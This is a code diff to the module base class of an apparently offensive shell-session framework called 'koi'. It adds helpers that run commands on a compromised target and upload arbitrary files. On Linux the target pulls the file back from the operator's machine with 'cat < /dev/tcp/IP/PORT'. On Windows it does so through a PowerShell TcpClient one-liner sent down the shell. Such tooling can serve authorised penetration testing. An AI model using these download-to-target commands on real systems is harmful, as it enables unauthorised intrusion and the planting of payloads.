@@ -7,14 +7,14 @@ import threading
 import time
 import uuid
 from abc import ABC, abstractmethod
-from typing import TYPE_CHECKING, List, Literal, Optional, Union
+from typing import TYPE_CHECKING, Callable, List, Literal, Optional, Union
 
 if TYPE_CHECKING:
     from koi.session import Session
 
 from koi.utils.models import CommandResult, StreamLine
 from koi.utils import ui
-from koi.utils.tcp import get_local_ip, spawn_recv_server
+from koi.utils.tcp import get_local_ip, spawn_recv_server, spawn_send_server
 
 import argparse
 
@@ -298,6 +298,75 @@ class KoiModule(ABC):
             if result:
                 self._logger.log_output(result.encode("utf-8", errors="replace"))
         return result
+
+    def _try_exec(self, cmd: str, timeout: float = 10.0) -> str:
+        """Run a Linux command via the side channel; return empty string on any error."""
+        try:
+            return self._exec_clean(cmd, timeout=timeout)
+        except Exception:
+            return ""
+
+    def _dispatch_ps(self, ps_cmd: str) -> None:
+        """Route a PS command to the session: raw socket for upgraded, sendline otherwise."""
+        if self.session.upgraded:
+            self.session.conn.sendall((ps_cmd + "\r\n").encode(self.session.encoding))
+            time.sleep(0.3)
+            r, _, _ = select.select([self.session.conn], [], [], 1.0)
+            if r:
+                self.session.conn.recv(4096)
+        elif self.session.os_type == "windows_ps":
+            self.sendline(ps_cmd)
+        else:
+            escaped = ps_cmd.replace('"', '\\"')
+            self.sendline(f'powershell -NoProfile -NonInteractive -c "{escaped}"')
+
+    def _upload_bytes_lin(
+        self,
+        raw: bytes,
+        dest: str,
+        timeout: float = 30.0,
+        on_progress: Optional[Callable[[int], None]] = None,
+    ) -> bool:
+        """Transfer *raw* bytes to *dest* on a Linux target via /dev/tcp."""
+        local_ip = self._get_local_ip()
+        port, thread, errors = spawn_send_server(raw, timeout=timeout, on_progress=on_progress)
+        self.exec(f"cat < /dev/tcp/{local_ip}/{port} > {dest}", timeout=timeout)
+        thread.join(timeout=timeout)
+        return not errors
+
+    def _upload_bytes_win(
+        self,
+        raw: bytes,
+        dest: str,
+        timeout: float = 30.0,
+        on_progress: Optional[Callable[[int], None]] = None,
+    ) -> bool:
+        """Transfer *raw* bytes to *dest* on a Windows target via a PS TCP client."""
+        local_ip = self._get_local_ip()
+        port, thread, errors = spawn_send_server(raw, timeout=timeout, on_progress=on_progress)
+        ps_cmd = (
+            f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{port});"
+            f"$_s=$_c.GetStream();"
+            f"$_f=[IO.File]::OpenWrite($ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath('{dest}'));"
+            f"$_b=New-Object byte[] 65536;"
+            f"while(($_n=$_s.Read($_b,0,$_b.Length))-gt 0){{$_f.Write($_b,0,$_n)}};"
+            f"$_f.Close();$_c.Close()"
+        )
+        self._dispatch_ps(ps_cmd)
+        thread.join(timeout=timeout)
+        return not errors
+
+    def _upload_bytes(
+        self,
+        raw: bytes,
+        dest: str,
+        timeout: float = 30.0,
+        on_progress: Optional[Callable[[int], None]] = None,
+    ) -> bool:
+        """Transfer *raw* bytes to *dest*, dispatching to the right platform."""
+        if self.session.os_type == "linux":
+            return self._upload_bytes_lin(raw, dest, timeout, on_progress)
+        return self._upload_bytes_win(raw, dest, timeout, on_progress)
 
     def run_module(self) -> None:
         if self._logger:
